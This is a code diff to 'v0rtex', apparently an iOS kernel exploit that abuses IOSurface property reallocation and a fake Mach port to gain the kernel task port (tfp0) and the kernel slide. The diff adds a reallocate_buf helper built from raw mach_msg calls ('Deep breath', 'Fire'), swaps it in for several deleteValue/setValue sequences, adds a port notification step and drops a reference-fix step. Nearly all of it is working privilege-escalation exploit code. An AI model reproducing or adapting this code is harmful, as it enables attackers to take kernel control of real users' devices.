@@ -115,18 +115,13 @@ static kern_return_t my_mach_zone_force_gc(host_t host)
 #pragma pack(4)
     typedef struct {
         mach_msg_header_t Head;
-    } Request __attribute__((unused));
+    } Request;
     typedef struct {
         mach_msg_header_t Head;
         NDR_record_t NDR;
         kern_return_t RetCode;
         mach_msg_trailer_t trailer;
-    } Reply __attribute__((unused));
-    typedef struct {
-        mach_msg_header_t Head;
-        NDR_record_t NDR;
-        kern_return_t RetCode;
-    } __Reply __attribute__((unused));
+    } Reply;
 #pragma pack()
 
     union {
@@ -135,7 +130,7 @@ static kern_return_t my_mach_zone_force_gc(host_t host)
     } Mess;
 
     Request *InP = &Mess.In;
-    Reply *Out0P = &Mess.Out;
+    Reply *OutP = &Mess.Out;
 
     InP->Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
     InP->Head.msgh_remote_port = host;
@@ -146,7 +141,7 @@ static kern_return_t my_mach_zone_force_gc(host_t host)
     kern_return_t ret = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
     if(ret == KERN_SUCCESS)
     {
-        ret = Out0P->RetCode;
+        ret = OutP->RetCode;
     }
     return ret;
 }
@@ -158,20 +153,14 @@ static kern_return_t my_mach_port_get_context(task_t task, mach_port_name_t name
         mach_msg_header_t Head;
         NDR_record_t NDR;
         mach_port_name_t name;
-    } Request __attribute__((unused));
+    } Request;
     typedef struct {
         mach_msg_header_t Head;
         NDR_record_t NDR;
         kern_return_t RetCode;
         mach_vm_address_t context;
         mach_msg_trailer_t trailer;
-    } Reply __attribute__((unused));
-    typedef struct {
-        mach_msg_header_t Head;
-        NDR_record_t NDR;
-        kern_return_t RetCode;
-        mach_vm_address_t context;
-    } __Reply __attribute__((unused));
+    } Reply;
 #pragma pack()
 
     union {
@@ -180,7 +169,7 @@ static kern_return_t my_mach_port_get_context(task_t task, mach_port_name_t name
     } Mess;
 
     Request *InP = &Mess.In;
-    Reply *Out0P = &Mess.Out;
+    Reply *OutP = &Mess.Out;
 
     InP->NDR = NDR_record;
     InP->name = name;
@@ -193,11 +182,136 @@ static kern_return_t my_mach_port_get_context(task_t task, mach_port_name_t name
     kern_return_t ret = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
     if(ret == KERN_SUCCESS)
     {
-        ret = Out0P->RetCode;
+        ret = OutP->RetCode;
     }
     if(ret == KERN_SUCCESS)
     {
-        *context = Out0P->context;
+        *context = OutP->context;
+    }
+    return ret;
+}
+
+static kern_return_t reallocate_buf(io_connect_t client, uint32_t surfaceId, uint32_t propertyId, void *buf, mach_vm_size_t len)
+{
+#pragma pack(4)
+    typedef struct {
+        mach_msg_header_t Head;
+        NDR_record_t NDR;
+        uint32_t selector;
+        mach_msg_type_number_t scalar_inputCnt;
+        mach_msg_type_number_t inband_inputCnt;
+        uint32_t inband_input[4];
+        mach_vm_address_t ool_input;
+        mach_vm_size_t ool_input_size;
+        mach_msg_type_number_t inband_outputCnt;
+        mach_msg_type_number_t scalar_outputCnt;
+        mach_vm_address_t ool_output;
+        mach_vm_size_t ool_output_size;
+    } DeleteRequest;
+    typedef struct {
+        mach_msg_header_t Head;
+        NDR_record_t NDR;
+        uint32_t selector;
+        mach_msg_type_number_t scalar_inputCnt;
+        mach_msg_type_number_t inband_inputCnt;
+        mach_vm_address_t ool_input;
+        mach_vm_size_t ool_input_size;
+        mach_msg_type_number_t inband_outputCnt;
+        mach_msg_type_number_t scalar_outputCnt;
+        mach_vm_address_t ool_output;
+        mach_vm_size_t ool_output_size;
+    } SetRequest;
+    typedef struct {
+        mach_msg_header_t Head;
+        NDR_record_t NDR;
+        kern_return_t RetCode;
+        mach_msg_type_number_t inband_outputCnt;
+        char inband_output[4096];
+        mach_msg_type_number_t scalar_outputCnt;
+        uint64_t scalar_output[16];
+        mach_vm_size_t ool_output_size;
+        mach_msg_trailer_t trailer;
+    } Reply;
+#pragma pack()
+
+    // Delete
+    union {
+        DeleteRequest In;
+        Reply Out;
+    } DMess;
+
+    DeleteRequest *DInP = &DMess.In;
+    Reply *DOutP = &DMess.Out;
+
+    DInP->NDR = NDR_record;
+    DInP->selector = IOSURFACE_DELETE_VALUE;
+    DInP->scalar_inputCnt = 0;
+
+    DInP->inband_input[0] = surfaceId;
+    DInP->inband_input[2] = transpose(propertyId);
+    DInP->inband_input[3] = 0x0; // Null terminator
+    DInP->inband_inputCnt = sizeof(DInP->inband_input);
+
+    DInP->ool_input = 0;
+    DInP->ool_input_size = 0;
+
+    DInP->inband_outputCnt = sizeof(uint32_t);
+    DInP->scalar_outputCnt = 0;
+    DInP->ool_output = 0;
+    DInP->ool_output_size = 0;
+
+    DInP->Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
+    DInP->Head.msgh_remote_port = client;
+    DInP->Head.msgh_local_port = mig_get_reply_port();
+    DInP->Head.msgh_id = 2865;
+    DInP->Head.msgh_reserved = 0;
+
+    // Set
+    union {
+        SetRequest In;
+        Reply Out;
+    } SMess;
+
+    SetRequest *SInP = &SMess.In;
+    Reply *SOutP = &SMess.Out;
+
+    SInP->NDR = NDR_record;
+    SInP->selector = IOSURFACE_SET_VALUE;
+    SInP->scalar_inputCnt = 0;
+
+    SInP->inband_inputCnt = 0;
+
+    SInP->ool_input = (mach_vm_address_t)buf;
+    SInP->ool_input_size = len;
+
+    SInP->inband_outputCnt = sizeof(uint32_t);
+    SInP->scalar_outputCnt = 0;
+    SInP->ool_output = 0;
+    SInP->ool_output_size = 0;
+
+    SInP->Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
+    SInP->Head.msgh_remote_port = client;
+    SInP->Head.msgh_local_port = mig_get_reply_port();
+    SInP->Head.msgh_id = 2865;
+    SInP->Head.msgh_reserved = 0;
+
+    // Deep breath
+    sched_yield();
+
+    // Fire
+    kern_return_t ret = mach_msg(&DInP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, sizeof(DeleteRequest), (mach_msg_size_t)sizeof(Reply), DInP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
+    if(ret == KERN_SUCCESS)
+    {
+        ret = DOutP->RetCode;
+    }
+    if(ret != KERN_SUCCESS)
+    {
+        return ret;
+    }
+    ret = mach_msg(&SInP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, sizeof(SetRequest), (mach_msg_size_t)sizeof(Reply), SInP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
+    if(ret == KERN_SUCCESS)
+    {
+        ret = SOutP->RetCode;
     }
     return ret;
 }
@@ -427,24 +541,6 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
     mach_port_t fakeport = port;
     port = MACH_PORT_NULL;
 
-    // Heapcraft
-    /*for(size_t i = NUM_AFTER; i > 0; --i)
-    {
-        if(MACH_PORT_VALID(after[i - 1]))
-        {
-            _kernelrpc_mach_port_destroy_trap(self, after[i - 1]);
-            after[i - 1] = MACH_PORT_NULL;
-        }
-    }
-    for(size_t i = NUM_BEFORE; i > 0; --i)
-    {
-        if(MACH_PORT_VALID(before[i - 1]))
-        {
-            _kernelrpc_mach_port_destroy_trap(self, before[i - 1]);
-            before[i - 1] = MACH_PORT_NULL;
-        }
-    }*/
-
 #define DATA_SIZE 0x1000
     uint32_t dict[DATA_SIZE / sizeof(uint32_t) + 7] =
     {
@@ -587,19 +683,9 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
     {
         *(volatile kport_t*)ptr = kport;
     }
-    uint32_t dummy;
-    size = sizeof(dummy);
 
-    sched_yield();
-    ret = IOConnectCallStructMethod(client, 11, request, sizeof(request), &dummy, &size);
-    if(ret != KERN_SUCCESS)
-    {
-        LOG("deleteValue(%u): %s", idx, mach_error_string(ret));
-        goto out3;
-    }
-    size = sizeof(dummy);
-    ret = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, dict, sizeof(dict), &dummy, &size);
-    LOG("setValue(%u): %s", idx, mach_error_string(ret));
+    ret = reallocate_buf(client, surface.data.id, idx, dict, sizeof(dict));
+    LOG("reallocate_buf: %s", mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
         goto out3;
@@ -646,6 +732,15 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
     }
     LOG("realport addr: " ADDR, realport_addr);
 
+    // Unregister before we rewrite the port
+    notify = MACH_PORT_NULL;
+    ret = mach_port_request_notification(self, fakeport, MACH_NOTIFY_PORT_DESTROYED, 0, MACH_PORT_NULL, MACH_MSG_TYPE_MAKE_SEND_ONCE, &notify);
+    LOG("mach_port_request_notification: %x, %s", notify, mach_error_string(ret));
+    if(ret != KERN_SUCCESS)
+    {
+        goto out3;
+    }
+
     ktask_t ktask;
     ktask.a.lock.data = 0x0;
     ktask.a.lock.type = 0x22;
@@ -661,18 +756,9 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
     {
         *(volatile kport_t*)ptr = kport;
     }
-    size = sizeof(dummy);
 
-    sched_yield();
-    ret = IOConnectCallStructMethod(client, 11, request, sizeof(request), &dummy, &size);
-    if(ret != KERN_SUCCESS)
-    {
-        LOG("deleteValue(%u): %s", idx, mach_error_string(ret));
-        goto out3;
-    }
-    size = sizeof(dummy);
-    ret = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, dict, sizeof(dict), &dummy, &size);
-    LOG("setValue(%u): %s", idx, mach_error_string(ret));
+    ret = reallocate_buf(client, surface.data.id, idx, dict, sizeof(dict));
+    LOG("reallocate_buf: %s", mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
         goto out3;
@@ -760,20 +846,10 @@ do \
     {
         *(volatile kport_t*)ptr = kport;
     }
-    size = sizeof(dummy);
-#undef KREAD
 
-    // we leak a ref on realport here
-    sched_yield();
-    ret = IOConnectCallStructMethod(client, 11, request, sizeof(request), &dummy, &size);
-    if(ret != KERN_SUCCESS)
-    {
-        LOG("deleteValue(%u): %s", idx, mach_error_string(ret));
-        goto out3;
-    }
-    size = sizeof(dummy);
-    ret = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, dict, sizeof(dict), &dummy, &size);
-    LOG("setValue(%u): %s", idx, mach_error_string(ret));
+#undef KREAD
+    ret = reallocate_buf(client, surface.data.id, idx, dict, sizeof(dict));
+    LOG("reallocate_buf: %s", mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
         goto out3;
@@ -974,10 +1050,6 @@ out5:;
     _kernelrpc_mach_port_destroy_trap(self, maps[0]);
     _kernelrpc_mach_port_destroy_trap(self, maps[1]);
 out4:;
-    ret = mach_ports_register(self, &fakeport, 1);
-    LOG("mach_ports_register: %s", mach_error_string(ret));
-    r = KCALL(OFF(COPYIN), &realport_addr, self_task + OFFSET_TASK_ITK_REGISTERED, sizeof(realport_addr), 0, 0, 0, 0); // Fix the ref we leaked earlier
-    LOG("copyin: %s", errstr(r));
     _kernelrpc_mach_port_destroy_trap(self, fakeport);
 out3:;
     for(size_t i = 0; i < NUM_AFTER; ++i)
